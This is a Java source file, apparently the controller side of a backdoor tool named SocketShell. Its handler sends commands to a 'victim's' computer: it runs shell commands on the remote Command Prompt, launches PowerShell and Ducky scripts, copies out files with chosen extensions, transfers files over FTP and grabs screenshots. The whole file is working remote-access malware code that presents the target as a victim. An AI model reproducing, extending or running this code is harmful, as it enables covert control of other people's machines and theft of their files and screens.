package com.github.thatcherdev.socketshell.shell;

import com.github.thatcherdev.socketshell.SocketShell;
import java.util.ArrayList;
import java.util.Arrays;
import com.github.thatcherdev.socketshell.backend.FTP;

public class HandleCommand {

	/**
	 * Handle command {@link command} given by user.
	 *
	 * @param command command given by user.
	 */
	public static void handle(String command) {
		if (command.equals("cmd")) {
			System.out.println(
					"Commands will now be run through vitim's computer's Command Prompt\nEnter 'back' to go back");
			while (true) {
				System.out.print("cmd");
				String cmdCommand = SocketShell.getInput("");
				if (cmdCommand.equals("back"))
					break;
				Shell.out.println("cmd " + cmdCommand);
				System.out.println(getResp());
			}
		} else if (command.equals("ps") || command.equals("ds")) {
			if (command.equals("ps"))
				Shell.out.println("cmd cd scripts && dir/b/a:-d *.ps1");
			else if (command.equals("ds"))
				Shell.out.println("cmd cd scripts && dir/b/a:-d *.duck");
			ArrayList<String> scripts = new ArrayList<String>(Arrays.asList(getResp().split("\n")));
			scripts.remove("File Not Found");
			if (scripts.size() == 0)
				System.out.println("No scripts found");
			else {
				System.out.println("Chose script:");
				for (String script : scripts)
					System.out.println("-" + script);
				String scriptName = SocketShell.getInput("");
				Shell.out.println(command + " " + scriptName);
				System.out.println(getResp());
			}
		} else if (command.equals("exfiles")) {
			System.out.println(
					"This will copy files with desired extensions from a folder and all it's subfolders to gathered\\ExfiltratedFiles relative to the backdoor executable");
			System.out.println("Enter victim's directory to search through:");
			String root = SocketShell.getInput("");
			System.out.println("Enter extensions of files separated by commas (i.e. txt,pdf,docx)");
			String exts = SocketShell.getInput("");
			Shell.out.println("exfiles " + root + "*" + exts);
			System.out.println("Exfiltrating...\n");
			System.out.println(getResp());
		} else if (command.equals("filesend")) {
			System.out.println("Enter local filepath of file to send:");
			String fileSend = SocketShell.getInput("file");
			System.out.println("Enter victim's filepath of file to receive:");
			String fileRec = SocketShell.getInput("");
			Shell.out.println("filesend " + fileRec);
			FTP.shell(fileSend, "send");
			System.out.println(getResp());
		} else if (command.equals("filerec")) {
			System.out.println("Enter victim's filepath of file to send:");
			String fileSend = SocketShell.getInput("");
			System.out.println("Enter local filepath of file to receive:");
			String fileRec = SocketShell.getInput("");
			Shell.out.println("filerec " + fileSend);
			FTP.shell(fileRec, "rec");
			System.out.println(getResp());
		} else if (command.equals("ss")) {
			Shell.out.println("ss");
			System.out.println("Receiving screenshot to '" + System.getProperty("user.dir") + "\\screenshot.png'...");
			FTP.shell("screenshot.png", "rec");
			System.out.println(getResp());
		} else if (command.equals("exit"))
			System.exit(0);
		else {
			Shell.out.println(command);
			System.out.println(getResp());
		}
	}

	/**
	 * Get response form client.
	 *
	 * @return response form client
	 */
	private static String getResp() {
		String resp = "";
		while (Shell.in.hasNextLine()) {
			String line = Shell.in.nextLine();
			if (line.equals("!$end$!"))
				break;
			resp += line + "\n";
		}
		return resp.substring(0, resp.length() - 1);
	}
}
